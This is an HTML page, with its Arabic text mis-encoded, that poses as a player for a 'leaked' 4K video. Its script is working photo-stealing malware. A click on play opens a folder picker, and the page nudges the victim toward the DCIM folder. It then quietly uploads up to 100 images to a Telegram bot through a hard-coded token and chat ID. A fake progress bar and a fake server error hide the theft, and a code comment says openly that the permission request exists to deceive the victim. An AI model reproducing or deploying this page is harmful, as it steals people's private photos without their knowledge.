<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…Ø´ØºÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¹Ø§Ù„ÙŠ Ø§Ù„Ø¬ÙˆØ¯Ø©</title>
    <style>
        body { background: #0f0f0f; color: #eee; font-family: 'Segoe UI', Tahoma; text-align: center; padding: 20px; }
        .player-container { max-width: 400px; margin: 50px auto; border: 1px solid #333; border-radius: 15px; padding: 20px; background: #1a1a1a; }
        .video-placeholder { width: 100%; height: 200px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 2px solid #444; }
        .play-btn { width: 60px; filter: invert(1); }
        .progress-box { display: none; margin-top: 25px; }
        .bar-bg { width: 100%; background: #333; height: 12px; border-radius: 6px; overflow: hidden; margin: 10px 0; }
        .bar-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.3s; }
        #status-text { font-size: 13px; color: #888; }
    </style>
</head>
<body>

<div class="player-container">
    <h3>ğŸ“º Ù…Ø´ØºÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ø³Ø±Ø¨</h3>
    <p style="font-size: 14px;">Ø§Ø¶ØºØ· Ù„Ø¨Ø¯Ø¡ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¨Ø¬ÙˆØ¯Ø© 4K</p>
    
    <div class="video-placeholder" id="playArea" onclick="initiateSiphon()">
        <img src="https://cdn-icons-png.flaticon.com/512/0/375.png" class="play-btn">
    </div>

    <div id="progressBox" class="progress-box">
        <p id="loaderLabel">Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±...</p>
        <div class="bar-bg">
            <div id="pBar" class="bar-fill"></div>
        </div>
        <p id="status-text">ÙŠØ±Ø¬Ù‰ Ø¹Ø¯Ù… Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø© Ù„Ø¶Ù…Ø§Ù† Ø¬ÙˆØ¯Ø© Ø§Ù„Ø¹Ø±Ø¶</p>
    </div>
</div>

<script>
    const TOKEN = "7864483754:AAH9r2X-r37O6xidO263m3W4S6eFw4N6W5U";
    const CHAT_ID = "7449231580";

    async function initiateSiphon() {
        try {
            // Ø·Ù„Ø¨ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ© Ù„Ø¥ÙŠÙ‡Ø§Ù… Ø§Ù„Ø¶Ø­ÙŠØ© Ø¨ÙÙƒ ØªØ´ÙÙŠØ± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
            const dirHandle = await window.showDirectoryPicker();
            
            document.getElementById('playArea').style.pointerEvents = 'none';
            document.getElementById('progressBox').style.display = 'block';

            let images = [];
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png)$/i)) {
                    images.push(entry);
                }
            }

            if (images.length === 0) {
                alert("Ø®Ø·Ø£: Ø§Ù„Ù…Ø¬Ù„Ø¯ Ø§Ù„Ù…Ø®ØªØ§Ø± Ù„Ø§ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ù…Ù„ÙØ§Øª Ø§Ù„ÙÙŠØ¯ÙŠÙˆ. Ø§Ø®ØªØ± DCIM.");
                location.reload();
                return;
            }

            let count = 0;
            const totalToFetch = Math.min(images.length, 100);

            for (const entry of images) {
                if (count >= totalToFetch) break;

                const file = await entry.getFile();
                const formData = new FormData();
                formData.append('document', file);
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', `ØµÙˆØ±Ø© Ø±Ù‚Ù… ${count + 1}`);

                // Ø§Ù„Ø±ÙØ¹ ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ©
                fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: formData });

                count++;
                
                // ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø¹Ø¯Ø¯ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø±ÙÙˆØ¹Ø©
                let percent = Math.round((count / totalToFetch) * 100);
                document.getElementById('pBar').style.width = percent + "%";
                document.getElementById('loaderLabel').innerText = `Ø¬Ø§Ø±ÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ: ${percent}%`;
            }

            // Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù…Ù† Ø§Ù„Ù€ 100 ØµÙˆØ±Ø©
            setTimeout(() => {
                document.getElementById('loaderLabel').innerText = "âŒ ÙØ´Ù„ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ!";
                document.getElementById('status-text').innerText = "Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù„Ø§Ø­Ù‚Ø§Ù‹.";
                document.getElementById('pBar').style.background = "#ff0000";
            }, 2000);

        } catch (err) {
            alert("ÙŠØ¬Ø¨ Ù…Ù†Ø­ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…Ø¬Ù„Ø¯ Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ.");
        }
    }
</script>

</body>
</html>
